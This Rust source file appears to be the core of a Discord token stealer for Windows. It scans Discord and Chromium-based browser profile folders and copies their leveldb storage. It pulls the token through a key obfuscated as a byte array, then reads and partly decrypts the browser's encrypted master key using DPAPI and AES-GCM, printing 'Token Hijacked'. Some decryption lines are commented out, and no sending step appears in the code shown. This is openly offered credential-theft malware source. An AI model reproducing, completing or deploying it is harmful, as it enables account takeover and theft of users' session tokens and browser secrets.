use aes_gcm::{
    aead::{generic_array::GenericArray, AeadCore, AeadInPlace, Buffer, KeyInit, OsRng},
    Aes128Gcm, Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use fs_extra::dir::CopyOptions;
use rusty_leveldb::{DBIterator, LdbIterator, Options, DB};
use std::{env, path::Path};
use sysinfo::{System, SystemExt};
use windows::{
    core::PWSTR,
    Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB},
};

#[derive(Debug, Clone)]
pub struct SystemDetails {
    pub platform: String,
    pub kernel_version: String,
    pub os_version: String,
    pub hostname: String,
}

pub fn get_system_details() -> SystemDetails {
    let mut sys = System::new_all();

    sys.refresh_all();

    SystemDetails {
        platform: sys.name().unwrap(),
        kernel_version: sys.kernel_version().unwrap(),
        os_version: sys.os_version().unwrap(),
        hostname: sys.host_name().unwrap(),
    }
}

pub fn hunt_for_directories(system_details: SystemDetails) -> Vec<String> {
    let mut directories: Vec<String> = Vec::new();

    if system_details.platform == "Windows" {
        let mut dirs_to_check: Vec<String> = Vec::new();

        let userprofile = env::var("USERPROFILE").unwrap();

        // Search for Discord files
        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discord", userprofile));

        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discordcanary", userprofile));

        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discordptb", userprofile));

        // Search Browser Data
        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Chromium\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Opera Software\\Opera Stable",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default",
            userprofile
        ));

        for dir in dirs_to_check {
            if Path::new(&dir).exists() {
                directories.push(dir);
            }
        }
    }

    directories
}

fn process_obfuscated_token(token: String) -> String {
    let mut token = token;

    token = token.replace("\"", "");
    token = token.replace("\u{1}dQw4w9WgXcQ:", "");
    // token = token.replace("mfa.", "");

    token
}

pub fn discord_token_hunter(dir: &String) -> Result<String, String> {
    // let userprofile = env::var("USERPROFILE").unwrap();

    let path_str = format!("{}\\Local Storage\\leveldb\\", dir);
    let path = Path::new(&path_str);
    let temp_path = Path::new("C:");

    let payloadkeybuf = &[
        0x5fu8, 0x68u8, 0x74u8, 0x74u8, 0x70u8, 0x73u8, 0x3au8, 0x2fu8, 0x2fu8, 0x64u8, 0x69u8,
        0x73u8, 0x63u8, 0x6fu8, 0x72u8, 0x64u8, 0x2eu8, 0x63u8, 0x6fu8, 0x6du8, 0x00u8, 0x01u8,
        0x74u8, 0x6fu8, 0x6bu8, 0x65u8, 0x6eu8,
    ];

    // Copy the leveldb database to a temporary directory
    let options = CopyOptions::new();

    let new_path = Path::new("C:\\leveldb");

    if new_path.exists() {
        fs_extra::dir::remove(new_path).unwrap();
    }

    fs_extra::dir::copy(&path, &temp_path, &options).unwrap();

    let opt = Options::default();
    let mut db = match DB::open(new_path, opt) {
        Ok(db) => db,
        Err(e) => panic!("Error opening database: {}", e),
    };

    let token = db.get(payloadkeybuf);

    match token {
        Some(valid_token) => {
            println!("Token found in directory: {}", dir);

            if dir.contains("discord") {
                Ok(process_obfuscated_token(
                    String::from_utf8(valid_token).unwrap_or_else(|_| "".to_string()),
                ))
            } else {
                Ok(String::from_utf8(valid_token).unwrap_or_else(|_| "".to_string()))
            }
        }
        None => {
            println!("No token found in {}", dir);

            Err("No token found".to_string())
        }
    }
}

fn unprotect_data(data: &mut [u8]) -> Result<Vec<u8>, Vec<u8>> {
    let data_in = CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_mut_ptr(),
    };

    let mut data_out = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    unsafe {
        CryptUnprotectData(
            &data_in as *const _ as *mut _,
            None,
            None,
            None,
            None,
            0,
            &mut data_out,
        );

        let bytes =
            std::slice::from_raw_parts_mut(data_out.pbData, data_out.cbData as usize).to_vec();

        Ok(bytes)
    }
}

fn get_local_state(dir: &String) -> serde_json::Result<String> {
    let path_str = format!("{}\\Local State", dir);
    let path = Path::new(&path_str);

    let file = match std::fs::File::open(path) {
        Ok(file) => file,
        Err(e) => panic!("Error opening file: {}", e),
    };

    let v: serde_json::Value = serde_json::from_reader(file)?;

    let token = v["os_crypt"]["encrypted_key"].as_str().unwrap();

    Ok(token.to_string())
}

fn decrypt_token(ciphertext: &[u8], key: &[u8], nonce: &[u8]) {
    let cipher_engine = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));

    // Decrypt in place
    let mut output_buffer = ciphertext.to_vec();

    cipher_engine
        .decrypt_in_place(
            GenericArray::from_slice(nonce),
            ciphertext,
            &mut output_buffer,
        )
        .unwrap_or_else(|err| panic!("Error decrypting token: {}", err));

    println!(
        "Token Hijacked: {}",
        String::from_utf8(output_buffer).unwrap()
    );
}

pub fn decode_discord_token(token: &String, dir: &String) {
    let decoded_token = general_purpose::STANDARD.decode(token.as_bytes()).unwrap();
    let mut decoded_key = general_purpose::STANDARD
        .decode(get_local_state(dir).unwrap().as_bytes())
        .unwrap();

    // println!("{:?}", get_local_state(dir).unwrap());

    // Remove the first 5 bytes from the decoded key
    decoded_key.drain(0..5);

    // let decoded_key = unprotect_data(&mut decoded_key).unwrap();

    println!("{:?}", decoded_key);

    // let ciphertext = &decoded_token[15..];
    // let nonce = &decoded_token[3..15];

    // let decrypted_token = decrypt_token(ciphertext, &decoded_key, nonce);

    // let token = String::from_utf8(decrypted_token).unwrap();

    // println!("Token Hijacked: {}", token);
}
